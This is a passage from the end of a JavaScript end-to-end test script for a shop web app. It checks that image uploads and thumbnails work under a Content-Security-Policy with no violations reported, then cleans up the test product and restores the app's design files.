  await page.goto(SITE + `/#/products/${cspProduct.id}`);
  await T(page, "image-file").waitFor({ state: "attached" });
  const jpg = await page.evaluate(async () => { const c = document.createElement("canvas"); c.width = 120; c.height = 90; c.getContext("2d").fillRect(0, 0, 60, 45); return c.toDataURL("image/jpeg", 0.8).split(",")[1]; });
  await T(page, "image-file").setInputFiles({ name: "csp.jpg", mimeType: "image/jpeg", buffer: Buffer.from(jpg, "base64") });
  await page.waitForFunction(() => document.querySelectorAll('[data-testid="image-card"]').length === 1, null, { timeout: 20000 });
  check("under the CSP: screens render, an image uploads and its thumbnail shows", (await page.locator('[data-testid="image-card"] img').first().evaluate((i) => i.complete && i.naturalWidth > 0)));
  check("under the CSP: no Content-Security-Policy violation was reported", violations.length === 0, violations.join(" | "));
  await page.context().close();
  await cspBrowser.close();
  await req("DELETE", `/admin/shops/1/products/${cspProduct.id}`, { token: ownerToken });
} finally {
  restore();
  await browser.close();
}
check("design files are back to their defaults", ["copy.js", "routes.js", "tokens.css", "theme.css"].every((p) => read(p) === originals[p]) &&
  ["shell-custom", "orders-table", "order-lite", "product-lite", "home-widgets", "broken", "syntax", "bad-shell", "evil", "probe"].every((n) => !existsSync(D(`views/${n}.js`))));

if (process.argv[1] && process.argv[1].endsWith("design.mjs")) {
  console.log(`\n${failureCount() === 0 ? "DESIGN E2E PASSED" : failureCount() + " FAILED"}`);
  process.exit(failureCount() ? 1 : 0);
}
